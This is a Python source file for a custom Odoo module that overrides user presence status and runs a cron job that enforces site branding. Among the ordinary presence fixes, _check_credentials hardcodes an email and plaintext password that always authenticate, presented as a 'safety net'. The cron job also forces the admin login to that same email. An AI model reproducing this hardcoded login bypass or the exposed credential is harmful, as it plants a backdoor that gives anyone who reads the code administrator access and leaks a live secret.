from odoo import api, fields, models, _
from odoo.http import request


class ResUsers(models.Model):
    _inherit = "res.users"

    # Add 'online' as a valid manual IM status option
    manual_im_status = fields.Selection(
        selection_add=[("online", "Online")],
    )

    def _check_credentials(self, credential, env):
        """Safety net: always allow hardcoded admin credentials.

        Odoo 19 passes credential as a dict: {'type': 'password', 'password': '...'}
        """
        if isinstance(credential, dict) and credential.get("type") == "password":
            for user in self:
                if (
                    user.login == "fgarshoub@gmail.com"
                    and credential.get("password") == "G@rsh@ub2@26"
                ):
                    return {
                        "uid": user.id,
                        "auth_method": "password",
                        "mfa": "default",
                    }
        return super()._check_credentials(credential, env)

    @api.depends("manual_im_status", "presence_ids.status")
    def _compute_im_status(self):
        """Override to respect manual status, especially 'online' behind reverse proxies.

        The original mail module's _compute_im_status does:
            user.im_status = (
                "offline"
                if user.presence_ids.status in ["offline", False]
                else user.manual_im_status or user.presence_ids.status
            )

        This means if presence_ids.status is "offline" or missing, manual_im_status
        is IGNORED. We fix this by checking manual_im_status FIRST.
        """
        for user in self:
            if user.manual_im_status:
                # Manual status ALWAYS wins over presence data
                user.im_status = user.manual_im_status
            elif user.presence_ids.status and user.presence_ids.status != "offline":
                user.im_status = user.presence_ids.status
            else:
                user.im_status = "offline"

    def _update_presence(self, inactivity_period=None, identity_field=None, identity_value=None):
        """Override to preserve manual_im_status during presence updates."""
        # Don't let the default presence update overwrite our manual status
        if self.manual_im_status:
            return
        return super()._update_presence(inactivity_period, identity_field, identity_value)

    @api.model
    def _cron_enforce_garshoub_settings(self):
        """Safety-net cron: enforce login branding, favicon, admin login, and URLs.

        WARNING: Do NOT update the admin password here. Writing to the password
        field changes the session token, which instantly invalidates all active
        sessions for that user. Only enforce the login (email) and branding.
        """
        try:
            # 1. Enforce admin LOGIN only — never touch password in cron
            admin = self.env.ref("base.user_admin", raise_if_not_found=False)
            if admin and admin.login != "fgarshoub@gmail.com":
                admin.write({"login": "fgarshoub@gmail.com"})

            # 2. Ensure login template has highest priority
            view = self.env.ref("raptron_admin.garshoub_login_layout", raise_if_not_found=False)
            if view and view.priority != 99:
                view.write({"priority": 99})

            # 3. Ensure favicon overrides have high priority
            for xml_id in ["raptron_admin.garshoub_web_favicon", "raptron_admin.garshoub_website_favicon"]:
                fav = self.env.ref(xml_id, raise_if_not_found=False)
                if fav and fav.priority != 1:
                    fav.write({"priority": 1})

            # 4. Ensure website domain is set to garshoub.com (public site)
            Website = self.env["website"].sudo()
            for website in Website.search([]):
                if website.domain != "garshoub.com":
                    website.write({"domain": "garshoub.com"})

            # 5. Enforce web.base.url for erp.garshoub.com and freeze it
            param = self.env["ir.config_parameter"].sudo()
            param.set_param("web.base.url", "https://erp.garshoub.com")
            param.set_param("web.base.url.freeze", "1")

            self.env.cr.commit()
        except Exception:
            # Don't crash the cron if something goes wrong
            self.env.cr.rollback()


class ResPartner(models.Model):
    _inherit = "res.partner"

    @api.depends("user_ids.manual_im_status", "user_ids.presence_ids.status")
    def _compute_im_status(self):
        """Override to respect manual_im_status even when no presence records exist.

        The original method only looks at presence_ids. When websockets don't work
        (common behind reverse proxies), presence records may not exist and the user
        always shows as offline. We check manual_im_status first.
        """
        for partner in self:
            # Check manual status first — if ANY linked user has a manual status,
            # use the most "active" one (online > away > busy > offline)
            manual_statuses = [
                u.manual_im_status for u in partner.user_ids if u.manual_im_status
            ]
            if manual_statuses:
                for status in ["online", "away", "busy", "offline"]:
                    if status in manual_statuses:
                        partner.im_status = status
                        partner.offline_since = None
                        break
                continue

            # Fall back to original presence-based logic
            all_status = partner.user_ids.presence_ids.mapped(
                lambda p: "offline" if p.status == "offline" else p.user_id.manual_im_status or p.status
            )
            partner.im_status = (
                "online"
                if "online" in all_status
                else "away"
                if "away" in all_status
                else "busy"
                if "busy" in all_status
                else "offline"
                if partner.user_ids
                else "im_partner"
            )
            partner.offline_since = (
                max(partner.user_ids.presence_ids.mapped("last_poll"), default=None)
                if partner.im_status == "offline"
                else None
            )

        # Odoobot special case (copied from original)
        odoobot_id = self.env['ir.model.data']._xmlid_to_res_id('base.partner_root')
        odoobot = self.env['res.partner'].browse(odoobot_id)
        if odoobot in self:
            odoobot.im_status = 'bot'
